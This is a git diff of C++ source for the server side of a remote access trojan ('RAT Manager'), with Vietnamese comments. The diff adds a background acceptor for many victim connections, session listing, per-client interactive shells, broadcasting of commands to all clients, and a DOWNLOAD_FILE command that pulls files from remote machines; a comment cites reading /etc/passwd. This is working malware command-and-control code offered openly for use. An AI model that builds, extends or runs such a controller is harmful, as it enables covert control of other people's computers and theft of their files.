@@ -7,12 +7,15 @@
 #include <netinet/in.h>
 #include <arpa/inet.h>
 #include <cstring>
+#include <future>
+#include <vector>
+#include <iomanip>
 
 namespace RAT
 {
     // Khởi tạo Server với port
     Server::Server(int port)
-        : server_fd_(-1), client_fd_(-1), port_(port), client_port_(0), is_running_(false) {}
+        : server_fd_(-1), port_(port), is_running_(false) {}
     Server::~Server()
     {
         stop();
@@ -60,6 +63,10 @@ namespace RAT
             return false;
         }
 
+        is_running_ = true;
+        // Khởi chạy Acceptor Thread chạy ngầm
+        acceptor_thread_ = std::thread(&Server::acceptor_worker, this);
+
         std::cout << Status::OK << "Server dang lang nghe tren port " << port_ << "...\n";
         return true;
     }
@@ -67,30 +74,208 @@ namespace RAT
     // Kết nối client
     bool Server::wait_for_client()
     {
-        // Kiểm tra socket server hợp lệ
-        if (server_fd_ < 0)
-            return false;
-
         std::cout << Status::INFO << "Dang cho Client ket noi...\n";
-
-        // Chờ kết nối từ client
-        struct sockaddr_in client_addr{};
-        socklen_t client_len = sizeof(client_addr);
-        client_fd_ = ::accept(server_fd_, reinterpret_cast<struct sockaddr *>(&client_addr), &client_len);
-        if (client_fd_ < 0)
+        return true;
+    }
+    void Server::acceptor_worker()
+    {
+        while (is_running_)
         {
-            std::cerr << Status::ERR << "Loi accept ket noi tu Client!\n";
-            return false;
+            // Chấp nhận kết nối từ client
+            struct sockaddr_in client_addr{};
+            socklen_t client_len = sizeof(client_addr);
+            int client_fd = ::accept(server_fd_, reinterpret_cast<struct sockaddr *>(&client_addr), &client_len);
+
+            if (client_fd < 0)
+            {
+                if (!is_running_)
+                    break;
+                continue;
+            }
+
+            // Lấy IP và Port của client
+            char ip_buffer[INET_ADDRSTRLEN];
+            inet_ntop(AF_INET, &client_addr.sin_addr, ip_buffer, sizeof(ip_buffer));
+            int client_port = ntohs(client_addr.sin_port);
+            int id = session_manager_.add_session(client_fd, ip_buffer, client_port);
+            std::cout << "\n"
+                      << Status::OK << "Client moi ket noi! [ID: " << id << "] tu "
+                      << ip_buffer << ":" << client_port << "\nRAT-Manager> " << std::flush;
+        }
+    }
+
+    // Command manager
+    void Server::print_manager_help()
+    {
+        std::cout << "\n==================== RAT MANAGER COMMANDS ====================\n"
+                  << "  SESSIONS                 : Xem danh sach Client dang ket noi\n"
+                  << "  INTERACT <id>            : Dieu khien Client theo ID\n"
+                  << "  BROADCAST <command>      : Phat lenh toi tat ca Client\n"
+                  << "  HELP                     : Hien thi danh sach lenh \n"
+                  << "  EXIT                     : Dong tat ca Client va tat Server\n"
+                  << "===============================================================\n\n";
+    }
+
+    // Liệt kê danh sách Client kết nối
+    void Server::list_sessions()
+    {
+        auto sessions = session_manager_.get_all_sessions();
+
+        // Nếu ds rỗng
+        if (sessions.empty())
+        {
+            std::cout << Status::INFO << "Hien tai khong co Client nao ket noi.\n";
+            return;
+        }
+
+        // In header ds
+        std::cout << "\n"
+                  << std::left << std::setw(6) << "ID"
+                  << std::setw(18) << "IP ADDRESS"
+                  << std::setw(10) << "PORT"
+                  << "STATUS\n";
+        std::cout << std::string(45, '-') << "\n";
+
+        // In thông tin ds
+        for (const auto &[id, session] : sessions)
+        {
+            std::cout << std::left << std::setw(6) << session->id
+                      << std::setw(18) << session->ip
+                      << std::setw(10) << session->port
+                      << "Active\n";
+        }
+        std::cout << "\nTong so Client connect: " << sessions.size() << "\n\n";
+    }
+
+    // Điều khiển client <ID>
+    void Server::interact_session(int session_id)
+    {
+        auto session = session_manager_.get_session(session_id);
+
+        // Kiểm tra session có client theo ID
+        if (!session)
+        {
+            std::cout << Status::ERR << "Khong tim thay Client voi ID: " << session_id << "\n";
+            return;
         }
         
-        // Lấy thông tin IP và port của client
-        char ip_buffer[INET_ADDRSTRLEN];
-        inet_ntop(AF_INET, &client_addr.sin_addr, ip_buffer, sizeof(ip_buffer));
-        client_ip_ = ip_buffer;
-        client_port_ = ntohs(client_addr.sin_port);
+        std::cout << Status::INFO << "Da ket noi truc tiep toi Client #" << session->id
+                  << " [" << session->ip << ":" << session->port << "]\n";
+        std::cout << Status::INFO << "'BACK' de quay lai Menu Manager, 'HELP' de xem cac lenh.\n\n";
+        
+        // Tương tác trực tiếp với client
+        run_client_shell(session);
+    }
 
-        std::cout << Status::OK << "Client da ket noi tu: " << client_ip_ << ":" << client_port_ << "\n";
-        return true;
+    void Server::run_client_shell(std::shared_ptr<ClientSession> session)
+    {
+        while (is_running_)
+        {
+            std::cout << "RAT-Shell [Client " << session->id << "]> " << std::flush;
+            std::string line;
+            
+            if (!std::getline(std::cin, line))
+                break;
+            if (line.empty()) continue;
+
+            // Lệnh BACK: Thoát về Manager
+            if (line == "BACK" || line == "back")
+            {
+                std::cout << Status::INFO << "Quay tro ve Menu RAT-Manager.\n";
+                break;
+            }
+            
+            std::string cmd_name, cmd_args;
+            if (!validate_and_process_command(line, cmd_name, cmd_args))
+                continue;
+            std::lock_guard<std::mutex> lock(session->socket_mtx);
+            // Xử lý DOWNLOAD_FILE
+            if (cmd_name == Command::DOWNLOAD_FILE)
+            {
+                std::istringstream iss(cmd_args);
+                std::string remote_path, local_path;
+                iss >> remote_path >> local_path;
+                std::string req = Command::DOWNLOAD_FILE + " " + remote_path;
+                if (!send_message(session->socket_fd, req))
+                {
+                    std::cerr << Status::ERR << "Mat ket noi toi Client!\n";
+                    session_manager_.remove_session(session->id);
+                    break;
+                }
+                recv_file_stream(session->socket_fd, local_path);
+                continue;
+            }
+            // Gửi lệnh thông thường
+            std::string full_cmd = cmd_name;
+            if (!cmd_args.empty())
+                full_cmd += " " + cmd_args;
+            if (!send_message(session->socket_fd, full_cmd))
+            {
+                std::cerr << Status::ERR << "Mat ket noi toi Client!\n";
+                session_manager_.remove_session(session->id);
+                break;
+            }
+            if (cmd_name == Command::EXIT)
+            {
+                std::cout << Status::INFO << "Client #" << session->id << " da dong ket noi.\n";
+                session_manager_.remove_session(session->id);
+                break;
+            }
+            std::string response;
+            if (!recv_message(session->socket_fd, response))
+            {
+                std::cerr << Status::ERR << "Mat ket noi toi Client!\n";
+                session_manager_.remove_session(session->id);
+                break;
+            }
+            std::cout << response << "\n";
+        }
+    }
+
+    // Broadcast tới các Client
+    void Server::broadcast_command(const std::string &cmd_line)
+    {
+        // Kiểm tra ds client
+        auto sessions = session_manager_.get_all_sessions();
+        if (sessions.empty())
+        {
+            std::cout << Status::INFO << "Hien tai khong co Client nao de gui broadcast.\n";
+            return;
+        }
+
+        std::cout << Status::INFO << "Dang gui broadcast lenh [" << cmd_line << "] toi "
+                  << sessions.size() << " clients...\n";
+
+        // Broadcast cho tất cả client
+        std::vector<std::future<std::string>> futures;
+        for (auto &[id, session] : sessions)
+        {
+            futures.push_back(std::async(std::launch::async, [session, cmd_line]()
+                                         {
+                
+                // 1. Khóa socket riêng của client
+                std::lock_guard<std::mutex> lock(session->socket_mtx);
+
+                // 2. Gửi lệnh
+                if (!send_message(session->socket_fd, cmd_line))
+                {
+                    return "[Client #" + std::to_string(session->id) + " (" + session->ip + ")]: Loi gui lenh!";
+                }
+
+                // 3. Chờ nhận kết quả từ client
+                std::string response;
+                if (!recv_message(session->socket_fd, response))
+                {
+                    return "[Client #" + std::to_string(session->id) + " (" + session->ip + ")]: Mat ket noi!";
+                }
+
+                return "[Client #" + std::to_string(session->id) + " (" + session->ip + ")]:\n" + response; }));
+        }
+        std::cout << "\n==================== KET QUA BROADCAST ====================\n";
+        for (auto &fut : futures)
+        {
+            std::cout << fut.get() << "\n------------------------------------------------------------\n";
+        }
     }
 
     // Kiểm tra tính hợp lệ của command trước khi gửi qua mạng
@@ -149,6 +334,20 @@ namespace RAT
         {
             return true;
         }
+
+        // 7. Lệnh DOWNLOAD_FILE: cần có 2 tham số: <remote_path> <local_path>
+        if (cmd_name == Command::DOWNLOAD_FILE)
+        {
+            std::istringstream iss(cmd_args);
+            std::string remote_path, local_path;
+            if (!(iss >> remote_path >> local_path))
+            {
+                std::cout << Status::ERR << "Cu phap dung: DOWNLOAD_FILE <remote_path> <local_path>\n";
+                return false; // Báo lỗi cú pháp, không gửi qua mạng
+            }
+            return true; // Cú pháp chuẩn -> Cho phép chuyển sang run_shell
+        }
+
         // Lệnh không nhận diện được
         std::cout << Status::ERR << "Lenh khong hop le! 'HELP' de xem danh sach lenh.\n";
         return false;
@@ -187,7 +386,28 @@ namespace RAT
             {
                 continue;
             }
-            // Tái tạo lại chuỗi lệnh chuẩn để gửi đi (VD: "LIST_DIR ." hoặc "READ_FILE /etc/passwd")
+
+            // Xử lý riêng cho lệnh DOWNLOAD_FILE
+            if (cmd_name == Command::DOWNLOAD_FILE)
+            {
+                std::istringstream iss(cmd_args);
+                std::string remote_path, local_path;
+                iss >> remote_path >> local_path;
+
+                // 1. Chỉ gửi tên lệnh và remote_path sang Client
+                std::string req = Command::DOWNLOAD_FILE + " " + remote_path;
+                if (!send_message(client_fd_, req))
+                {
+                    std::cerr << Status::ERR << "Mat ket noi toi Client (loi gui lenh)!\n";
+                    break;
+                }
+
+                // 2. Chuyển socket sang chế độ nhận file stream và lưu vào local_path trên Server
+                recv_file_stream(client_fd_, local_path);
+                continue;
+            }
+
+            // Ghép lại lệnh chuẩn để gửi đi (VD: "LIST_DIR ." hoặc "READ_FILE /etc/passwd")
             std::string full_cmd = cmd_name;
             if (!cmd_args.empty())
             {
@@ -212,7 +432,7 @@ namespace RAT
                 std::cerr << Status::ERR << "Mat ket noi toi Client (khong nhan duoc phan hoi)!\n";
                 break;
             }
-            // In kết quả 
+            // In kết quả
             std::cout << response << "\n";
         }
         // Đóng socket client khi kết thúc phiên shell
